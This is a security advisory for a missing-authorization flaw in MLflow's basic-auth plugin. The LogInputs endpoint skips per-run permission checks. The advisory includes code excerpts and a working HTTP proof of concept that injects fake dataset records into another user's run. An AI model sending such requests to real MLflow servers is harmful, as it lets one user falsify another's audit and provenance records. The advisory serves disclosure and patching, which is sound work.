# [M] MLflow: LogInputs endpoint bypasses per-run UPDATE authorization in basic-auth

## Summary
Severity: Medium
Advisory: GHSA-3p64-6gvh-82v5
CVE: CVE-2026-69146
CWE: CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-3p64-6gvh-82v5
Type: github-advisory

## Affected
- npm: `mlflow` — affected >=0 <3.15.0

## Details
### Summary

When MLflow is deployed with the built-in basic-auth plugin (`--app-name basic-auth`), any authenticated user can inject arbitrary dataset records into another user's run by calling `POST /api/2.0/mlflow/runs/log-inputs`. The `LogInputs` proto handler is absent from the `BEFORE_REQUEST_HANDLERS` map in `mlflow/server/auth/__init__.py`, so the before-request hook skips authorization entirely and the request succeeds. Standard write endpoints on the same run -- such as `POST /api/2.0/mlflow/runs/log-metric` -- correctly return HTTP 403.

### Details

MLflow's basic-auth app gates every HTTP handler through a before-request hook (`_before_request`) that looks up the relevant permission validator in `BEFORE_REQUEST_VALIDATORS`. Validators are built from the `BEFORE_REQUEST_HANDLERS` dictionary, which maps each protobuf request class to a callable. When a class is absent from the dict (or mapped to `None`), `get_before_request_handler` returns `None`, and the resulting entry in `BEFORE_REQUEST_VALIDATORS` is `(path, method): None`.

Inside `_before_request`:

```python
# mlflow/server/auth/__init__.py  _before_request()
if validator := _find_validator(request):   # None is falsy -- branch skipped
    if not validator():
        return make_forbidden_response()
elif _is_proxy_artifact_path(request.path):  # not a proxy path
    ...
# falls through: any authenticated request is allowed
```

The `LogInputs` protobuf class is not present in `BEFORE_REQUEST_HANDLERS`:

```python
# mlflow/server/auth/__init__.py  BEFORE_REQUEST_HANDLERS dict
# LogInputs is absent; all run-write operations below ARE present:
LogBatch: validate_can_update_run,
LogMetric: validate_can_update_run,
SetTag:    validate_can_update_run,
LogParam:  validate_can_update_run,
# LogInputs: <missing>
```

The route `/api/2.0/mlflow/runs/log-inputs` (and the identical `/ajax-api/` variant) therefore admits any valid credential, regardless of which experiment or run is targeted. The `LogInputs` handler writes `DatasetInput` records directly to the run's lineage table without any ownership check.

### PoC

Prerequisites: MLflow v3.13.0 running with `--app-name basic-auth`. Two accounts: alice (creates experiment 2 and run A) and bob (creates experiment 4 and run B).

1. Confirm the authorized endpoint correctly denies alice's write to bob's run:

```
POST /api/2.0/mlflow/runs/log-metric HTTP/1.1
Authorization: Basic YWxpY2U6YWxpY2VfcGFzc3dvcmQxMjM=   (alice:alice_password123)
Content-Type: application/json

{"run_id": "<bob_run_id>", "key": "test", "value": 1.0, "timestamp": 0, "step": 0}
```

Response: HTTP 403 Permission denied

2. Inject a dataset record into bob's run as alice:

```
POST /api/2.0/mlflow/runs/log-inputs HTTP/1.1
Authorization: Basic YWxpY2U6YWxpY2VfcGFzc3dvcmQxMjM=   (alice:alice_password123)
Content-Type: application/json

{"run_id": "<bob_run_id>", "datasets": [{"dataset": {"name": "ATTACKER_injected", "digest": "evil123", "profile": "attacker_controlled"}}]}
```

Response: HTTP 200 {}

3. Confirm injection persisted:

```
GET /api/2.0/mlflow/runs/get?run_id=<bob_run_id> HTTP/1.1
Authorization: Basic Ym9iOmJvYl9wYXNzd29yZF9uZXcxMjM=   (bob:bob_password_new123)
```

Response: HTTP 200 -- dataset_inputs array contains `{"name":"ATTACKER_injected","digest":"evil123","profile":"attacker_controlled"}`.

### Impact

Any authenticated MLflow user can corrupt the dataset lineage metadata of any other user's run. In ML compliance workflows, dataset provenance records are audit evidence for model reproducibility and regulatory review. Injecting fake or misleading dataset entries into a competitor's runs can silently invalidate audit trails, cause misattribution of model training data, or introduce confusion about which datasets were used to train a model. The attacker needs only a valid credential; no elevated permissions are required.

## References
- https://github.com/mlflow/mlflow/security/advisories/GHSA-3p64-6gvh-82v5
- https://github.com/mlflow/mlflow/pull/24291
- https://github.com/mlflow/mlflow/commit/5c34aec5669e2386b38b5ee0855cd61174e27693
- https://github.com/mlflow/mlflow
- https://github.com/mlflow/mlflow/releases/tag/v3.15.0
